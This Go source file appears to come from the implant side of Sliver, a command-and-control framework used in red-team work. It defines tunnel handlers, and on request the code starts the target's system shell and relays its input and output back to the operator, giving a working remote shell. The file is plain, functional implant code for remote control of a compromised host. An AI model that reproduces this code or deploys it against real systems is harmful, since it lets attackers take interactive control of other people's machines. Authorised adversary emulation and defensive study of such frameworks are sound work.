package handlers

import (
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "sliver/protobuf/sliver"
	"sliver/sliver/shell"
	"sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
)

const (
	readBufSize = 1024
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{
		pb.MsgShellReq: shellReqHandler,

		pb.MsgTunnelData: tunnelDataHandler,
	}
)

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	return tunnelHandlers
}

func tunnelDataHandler(req []byte, connection *transports.Connection) {
	tunData := &pb.TunnelData{}
	proto.Unmarshal(req, tunData)
	tunnel := connection.Tunnel(tunData.TunnelID)
	tunnel.Writer.Write(tunData.Data)
}

func shellReqHandler(req []byte, connection *transports.Connection) {

	shellReq := &pb.ShellReq{}
	err := proto.Unmarshal(req, shellReq)
	if err != nil {
		return
	}

	shellPath := shell.GetSystemShellPath()
	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	tunnel := &transports.Tunnel{
		ID:     shellReq.TunnelID,
		Reader: systemShell.Stdout,
		Writer: systemShell.Stdin,
	}
	connection.AddTunnel(tunnel)

	go func() {
		defer connection.RemoveTunnel(tunnel.ID)
		for {
			readBuf := make([]byte, readBufSize)
			n, err := tunnel.Reader.Read(readBuf)
			if err == io.EOF {
				break
			}
			data, err := proto.Marshal(&pb.TunnelData{
				TunnelID: tunnel.ID,
				Data:     readBuf[:n],
			})
			connection.Send <- &pb.Envelope{
				Type: pb.MsgTunnelData,
				Data: data,
			}
		}
	}()

	// {{if .Debug}}
	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
